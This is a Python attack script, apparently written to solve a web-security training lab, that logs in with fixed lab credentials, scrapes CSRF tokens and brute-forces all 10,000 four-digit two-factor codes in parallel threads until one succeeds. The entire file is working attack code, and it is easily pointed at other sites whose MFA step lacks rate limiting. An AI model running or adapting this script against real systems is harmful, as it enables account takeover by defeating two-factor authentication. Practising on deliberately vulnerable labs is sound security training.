from concurrent.futures import ThreadPoolExecutor
import sys
import requests
from bs4 import BeautifulSoup
import urllib3
from colorama import Fore, init

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
init(autoreset=True)

def csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {"name": "csrf"})['value']
    return csrf

def exploit(code):
    url = sys.argv[1]
    s = requests.Session()
    csrf_login = csrf_token(s, url + '/login')
    login_data = {'csrf': csrf_login, 'username': 'carlos', 'password': 'montoya'}
    s.post(url + '/login', data=login_data, verify=False, proxies=proxies)
    csrf_login2 = csrf_token(s, url + '/login2')
    login2_data = {'csrf': csrf_login2, 'mfa-code': str(code).zfill(4)}
    response = s.post(url + '/login2', data=login2_data, verify=False, proxies=proxies)
    if 'Incorrect security code' not in response.text:
        print(Fore.GREEN + f"[+] Correct code found: {str(code).zfill(4)}")
        print(Fore.GREEN + "[+] Congratulations, you solved the lab!")
        sys.exit(-1)
    else:
        return None


def main():
    if len(sys.argv) != 2:
        print("Usage: python script.py <url>")
        return

    url = sys.argv[1]
    print(Fore.YELLOW + '[!] BruteForcing the security code..')
    print(Fore.YELLOW + '[!] This may take some time to succeed..')
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(exploit, code) for code in range(10000)]
        for future in futures:
            result = future.result()
            if result is not None:
                sys.exit(-1)

if __name__ == "__main__":
    main()
